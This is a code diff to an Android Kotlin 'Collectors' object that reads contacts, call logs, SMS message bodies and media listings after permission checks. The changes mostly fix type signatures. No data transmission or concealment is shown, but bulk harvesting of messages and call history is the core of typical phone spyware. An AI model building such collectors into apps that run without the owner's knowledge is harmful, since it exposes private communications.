@@ -9,9 +9,9 @@ import android.provider.Telephony
 /** قراءة البيانات من مزودي المحتوى في النظام بعد التحقق من الصلاحيات. */
 object Collectors {
 
-    fun contacts(context: Context): List> {
+    fun contacts(context: Context): List<Map<String, Any>> {
         if (!Permissions.has(context, android.Manifest.permission.READ_CONTACTS)) return emptyList()
-        val out = mutableListOf>()
+        val out = mutableListOf<Map<String, Any>>()
         val cursor = context.contentResolver.query(
             ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
             arrayOf(
@@ -34,18 +34,12 @@ object Collectors {
         return out
     }
 
-    fun callLog(context: Context, limit: Int = 100): List> {
+    fun callLog(context: Context, limit: Int = 100): List<Map<String, Any>> {
         if (!Permissions.has(context, android.Manifest.permission.READ_CALL_LOG)) return emptyList()
-        val out = mutableListOf>()
+        val out = mutableListOf<Map<String, Any>>()
         val cursor = context.contentResolver.query(
             CallLog.Calls.CONTENT_URI,
-            arrayOf(
-                CallLog.Calls.NUMBER,
-                CallLog.Calls.CACHED_NAME,
-                CallLog.Calls.TYPE,
-                CallLog.Calls.DURATION,
-                CallLog.Calls.DATE,
-            ),
+            arrayOf(CallLog.Calls.NUMBER, CallLog.Calls.NAME, CallLog.Calls.TYPE, CallLog.Calls.DURATION, CallLog.Calls.DATE),
             null,
             null,
             "${CallLog.Calls.DATE} DESC",
@@ -74,9 +68,9 @@ object Collectors {
         return out
     }
 
-    fun messages(context: Context, limit: Int = 100): List> {
+    fun messages(context: Context, limit: Int = 100): List<Map<String, Any>> {
         if (!Permissions.has(context, android.Manifest.permission.READ_SMS)) return emptyList()
-        val out = mutableListOf>()
+        val out = mutableListOf<Map<String, Any>>()
         val cursor = context.contentResolver.query(
             Telephony.Sms.CONTENT_URI,
             arrayOf(Telephony.Sms.ADDRESS, Telephony.Sms.BODY, Telephony.Sms.TYPE, Telephony.Sms.DATE),
@@ -103,9 +97,10 @@ object Collectors {
         return out
     }
 
-    fun media(context: Context, limit: Int = 50): List> {
-        if (!ContextCompat_mediaPermission(context)) return emptyList()
-        val out = mutableListOf>()
+    fun media(context: Context, limit: Int = 50): List<Map<String, Any>> {
+        val images = ContextCompat_mediaPermission(context)
+        if (!images) return emptyList()
+        val out = mutableListOf<Map<String, Any>>()
         val projection = arrayOf(
             MediaStore.MediaColumns._ID,
             MediaStore.MediaColumns.DISPLAY_NAME,
